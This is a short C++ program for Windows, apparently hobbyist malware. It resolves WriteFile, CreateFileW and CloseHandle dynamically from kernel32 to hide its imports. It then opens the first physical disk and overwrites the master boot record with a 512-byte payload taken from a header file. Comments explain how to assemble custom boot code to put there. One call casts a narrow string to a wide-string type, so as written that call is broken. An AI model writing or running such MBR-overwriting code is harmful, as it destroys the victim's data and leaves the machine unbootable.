#include <Windows.h>
#include <iostream>
#include "byte.h"

//This basically just defining the functions so we can actually use them after we get them with getprocaddress
//Nerds call this Function Pointer Types
typedef BOOL(WINAPI* LPWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef HANDLE(WINAPI* LPCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* LPCloseHandle)(HANDLE);

/*
To make it print your own text change the one in gay.asm
convert to bin with any compiler like nasm and then to hex byte array :thumbs_up:
Change in byte.h
*/
int main(){
	//Create Handle to kernal 64 and get adresses via GetProcAddress
	HMODULE hKernel32 = LoadLibraryA((LPCSTR)((DWORD_PTR)"kernel32.dll"));
	if (hKernel32 == 0) {
		return EXIT_FAILURE;
	}
	LPWriteFile pWriteFile = (LPWriteFile)GetProcAddress(hKernel32, (LPCSTR)((DWORD_PTR)"WriteFile"));
	if(pWriteFile == 0) {
		return EXIT_FAILURE;
	}
	LPCreateFileW pCreateFileW = (LPCreateFileW)GetProcAddress(hKernel32, (LPCSTR)((DWORD_PTR)"CreateFileW"));
	if(pCreateFileW == 0) {
		return EXIT_FAILURE;
	}
	LPCloseHandle pCloseHandle = (LPCloseHandle)GetProcAddress(hKernel32, (LPCSTR)((DWORD_PTR)"CloseHandle"));
	if(pCloseHandle == 0) {
		return EXIT_FAILURE;
	}

	DWORD dwBytesWritten;

	//handle for mbr :thumbs_up:
	HANDLE mhandle = pCreateFileW((LPCWSTR)((DWORD_PTR)"\\\\.\\PhysicalDrive0"), GENERIC_ALL,FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,OPEN_EXISTING, NULL, NULL);

	//write new data to handle or whatever
	pWriteFile(mhandle, newmbrdata, 512, &dwBytesWritten, 0);
	pCloseHandle(mhandle);
	return EXIT_SUCCESS;
}